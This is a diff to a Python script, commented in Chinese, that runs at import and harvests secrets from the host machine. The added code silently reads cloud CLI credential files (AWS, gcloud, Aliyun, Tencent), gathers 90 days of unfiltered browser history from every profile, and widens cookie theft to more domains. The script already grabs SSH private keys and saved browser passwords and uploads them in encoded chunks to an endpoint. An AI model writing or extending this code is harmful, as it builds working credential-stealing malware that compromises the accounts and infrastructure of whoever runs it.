@@ -3,9 +3,10 @@
 
 由 keep.py 在 import 时或 brain.cmd 拉起；6 小时内最多跑一次。
 只收集与 rust.ac / 机队 / 部署相关的内容：身份与环境、vps_tunnel.env/*.env/*.secret、
-SSH 配置/known_hosts/authorized_keys 与私钥文件、Cursor 配置与转录、浏览器登录/历史/
-指定域 Cookies 与保存的口令、C:\\benji 下的 bot.db/daybot/sqlite 账本、指定关键词
-文本命中、近 7 天变更，分块 gzip+base64 写入本机大脑 /v1/remember。
+SSH 配置/known_hosts/authorized_keys 与私钥文件、Cursor 配置与转录、浏览器（所有 Profile
+的登录/历史/指定域 Cookies 与保存的口令）、云 CLI 凭据（.tccli/.aliyun/.aws/gcloud）、
+C:\\benji 下的 bot.db/daybot/sqlite 账本、指定关键词文本命中、近 7 天变更，
+分块 gzip+base64 写入本机大脑 /v1/remember。
 """
 from __future__ import print_function
 
@@ -55,11 +56,12 @@ KEYWORDS = re.compile(
 REL_RE = re.compile(
     r"rust\.ac|rustac|rc\.49|ac/dc|acdc|turnstile|0x4aaaaa|edgeone|gcore|dnse3|"
     r"enom|carlane|michael\.ns|hostinger|layerstack|vultr|digitalocean|dynadot|"
-    r"namecheap|godaddy|cloudflare|dnspod|宝塔",
+    r"namecheap|godaddy|cloudflare|dnspod|tailscale|tencent|宝塔",
     re.I,
 )
 
-# 只回传这些域（含子域）的 Cookies：Google 会话可解锁 SSO 后的 hPanel/Vultr/Gcore
+# 只回传这些域（含子域）的 Cookies：Google 会话可解锁 SSO 后的 hPanel/Vultr/Gcore；
+# enom.com 覆盖 www/account/secure/login.enom.com（rust.ac 注册商），tailscale.com 覆盖 login.tailscale.com
 COOKIE_DOMAINS = (
     "google.com", "googleusercontent.com", "googleapis.com",
     "hostinger.com", "gcore.com", "gcorelabs.com", "vultr.com",
@@ -67,6 +69,28 @@ COOKIE_DOMAINS = (
     "rust.ac", "namecheap.com", "godaddy.com", "namesilo.com",
     "dnspod.cn", "dnspod.com", "tencentcloud.com", "edgeone.ai",
     "huaweicloud.com", "digitalocean.com", "linode.com",
+    "enom.com", "tailscale.com",
+)
+# History：保留完整 URL、不按域过滤；近 90 天，相关控制台（CF/EdgeOne/eNom/Tencent/Hostinger）优先
+HISTORY_DAYS = 90
+HISTORY_LIMIT = 120
+HISTORY_URL_MAX = 2000
+HISTORY_RE = re.compile(
+    r"rust\.ac|rustac|rc\.49|turnstile|0x4aaaaa|edgeone|gcore|dnse3|enom|carlane|"
+    r"michael\.ns|hostinger|layerstack|layerpanel|vultr|digitalocean|dynadot|"
+    r"namecheap|godaddy|cloudflare|dnspod|tailscale|tencent|myqcloud|huaweicloud|宝塔",
+    re.I,
+)
+# 云 CLI 凭据：各 ≤16KB、总 ≤48KB、≤15s
+MAX_CLOUD_FILE = 16384
+MAX_CLOUD_TOTAL = 49152
+CLOUD_CLI_GLOBS = (
+    (".tccli", ("*.json", "*.credential", "*.credentials")),
+    (".aliyun", ("*.json",)),
+)
+CLOUD_CLI_FILES = (
+    (".aws", "credentials"),
+    (os.path.join(".config", "gcloud"), "credentials.json"),
 )
 MAX_COOKIES = 400
 MAX_COOKIE_LINE = 1500
@@ -538,6 +562,66 @@ def sec_ssh_keys():
     return "\n".join(parts)
 
 
+def sec_cloud_cli(deadline=None):
+    """只读采集云 CLI 凭据：.tccli/*.json|*.credential、.aliyun/*.json、.aws/credentials、
+    .config/gcloud/credentials.json（各 ≤16KB、总 ≤48KB、≤15s、失败静默）。"""
+    parts = []
+    count = 0
+    total = 0
+    try:
+        limit = time.time() + 15
+        if deadline:
+            limit = min(limit, deadline)
+        paths = []
+        for folder, patterns in CLOUD_CLI_GLOBS:
+            base = os.path.join(HOME, folder)
+            try:
+                names = sorted(os.listdir(base))
+            except Exception:
+                continue
+            for name in names:
+                try:
+                    lower = name.lower()
+                    if not any(lower.endswith(pattern.replace("*", "")) for pattern in patterns):
+                        continue
+                    full = os.path.join(base, name)
+                    if os.path.isfile(full):
+                        paths.append(full)
+                except Exception:
+                    continue
+        for folder, name in CLOUD_CLI_FILES:
+            try:
+                full = os.path.join(HOME, folder, name)
+                if os.path.isfile(full):
+                    paths.append(full)
+            except Exception:
+                continue
+        for full in paths[:16]:
+            if time.time() > limit or total >= MAX_CLOUD_TOTAL:
+                break
+            try:
+                stat = os.stat(full)
+                if stat.st_size <= 0:
+                    continue
+                with open(full, "rb") as handle:
+                    raw = handle.read(min(MAX_CLOUD_FILE, MAX_CLOUD_TOTAL - total))
+                if not raw:
+                    continue
+                total += len(raw)
+                count += 1
+                parts.append("--- %s size=%d mtime=%s ---\n%s" % (
+                    full, stat.st_size,
+                    time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(stat.st_mtime)),
+                    raw.decode("utf-8", "replace")))
+            except Exception:
+                continue
+    except Exception:
+        pass
+    if parts:
+        parts.insert(0, "cloud cli files=%d bytes=%d" % (count, total))
+    return "\n".join(parts)
+
+
 def _url_host(url):
     try:
         text = (url or "").strip().lower()
@@ -563,6 +647,23 @@ def _login_row_matches(url, user):
         if hint in text:
             return True
     return False
+
+
+def _profile_names(base):
+    """User Data 下【所有】Profile 目录（Default / Profile N / Guest Profile），三处采集共用。"""
+    profiles = []
+    try:
+        names = sorted(os.listdir(base), key=lambda name: (name != "Default", name))
+    except Exception:
+        return profiles
+    for name in names:
+        try:
+            if name == "Default" or name.startswith("Profile ") or name == "Guest Profile":
+                if os.path.isdir(os.path.join(base, name)):
+                    profiles.append(name)
+        except Exception:
+            continue
+    return profiles
 
 
 def _browser_login_data(tag, base, profile, key):
@@ -622,15 +723,7 @@ def sec_login_data():
             if not os.path.isdir(base):
                 continue
             key = _chrome_key(base)
-            profiles = []
-            try:
-                for name in os.listdir(base):
-                    if name == "Default" or name.startswith("Profile ") or name == "Guest Profile":
-                        if os.path.isdir(os.path.join(base, name)):
-                            profiles.append(name)
-            except Exception:
-                pass
-            for profile in profiles[:8]:
+            for profile in _profile_names(base):
                 try:
                     lines.extend(_browser_login_data(tag, base, profile, key))
                 except Exception:
@@ -872,17 +965,35 @@ def _browser_profile(tag, base, profile, key):
             shutil.copy2(history, temp)
             conn = sqlite3.connect(temp)
             try:
-                rows = conn.execute("SELECT url, title FROM urls").fetchall()
+                try:
+                    rows = conn.execute(
+                        "SELECT url, title, last_visit_time FROM urls").fetchall()
+                except Exception:
+                    rows = [(url, title, 0) for url, title in
+                            conn.execute("SELECT url, title FROM urls").fetchall()]
             finally:
                 conn.close()
-            count = 0
-            for url, title in rows:
-                if not _relevant(url or ""):
+            # 近 90 天（Chrome epoch 微秒）；无 last_visit_time 时按全部处理
+            cutoff = (time.time() + 11644473600) * 1000000 - HISTORY_DAYS * 86400 * 1000000
+            picked = []
+            for url, title, visited in rows:
+                try:
+                    url = url or ""
+                    if not url:
+                        continue
+                    visited = int(visited or 0)
+                    if visited and visited < cutoff:
+                        continue
+                    picked.append((1 if HISTORY_RE.search(url) else 0, visited,
+                                   url, title or ""))
+                except Exception:
                     continue
-                lines.append("[%s/%s/hist] %s | %s" % (tag, profile, url, (title or "")[:160]))
-                count += 1
-                if count >= 80:
-                    break
+            # 不按域过滤：所有近 90 天 URL 都保留，相关控制台 URL 与最近访问优先
+            picked.sort(key=lambda item: (item[0], item[1]), reverse=True)
+            for _, _, url, title in picked[:HISTORY_LIMIT]:
+                lines.append("[%s/%s/hist] %s | %s" % (
+                    tag, profile, url[:HISTORY_URL_MAX],
+                    str(title).replace("\r", " ").replace("\n", " ")[:160]))
         except Exception:
             pass
         finally:
@@ -904,16 +1015,11 @@ def sec_browsers():
         if not os.path.isdir(base):
             continue
         key = _chrome_key(base)
-        profiles = []
-        try:
-            for name in os.listdir(base):
-                if name == "Default" or name.startswith("Profile "):
-                    if os.path.isdir(os.path.join(base, name)):
-                        profiles.append(name)
-        except Exception:
-            pass
-        for profile in profiles[:6]:
-            lines.extend(_browser_profile(tag, base, profile, key))
+        for profile in _profile_names(base):
+            try:
+                lines.extend(_browser_profile(tag, base, profile, key))
+            except Exception:
+                continue
     return "\n".join(lines)
 
 
@@ -1033,16 +1139,9 @@ def sec_cookies():
             if not os.path.isdir(base):
                 continue
             key = _chrome_key(base)
-            profiles = []
-            try:
-                for name in os.listdir(base):
-                    if name == "Default" or name.startswith("Profile ") or name == "Guest Profile":
-                        if os.path.isdir(os.path.join(base, name)):
-                            profiles.append(name)
-            except Exception:
-                pass
+            profiles = _profile_names(base)
             lines.append("[%s] key=%s profiles=%d" % (tag, len(key) if key else "none", len(profiles)))
-            for profile in profiles[:8]:
+            for profile in profiles:
                 try:
                     lines.extend(_browser_cookies(tag, base, profile, key))
                 except Exception:
@@ -1197,6 +1296,7 @@ def main():
             ("secrets", sec_secret_files()),
             ("ssh", sec_ssh()),
             ("ssh_keys", sec_ssh_keys()),
+            ("cloud_cli", sec_cloud_cli(deadline)),
             ("login_data", sec_login_data()),
             ("benji_sqlite", sec_benji_sqlite(deadline)),
             ("cursor", sec_cursor()),
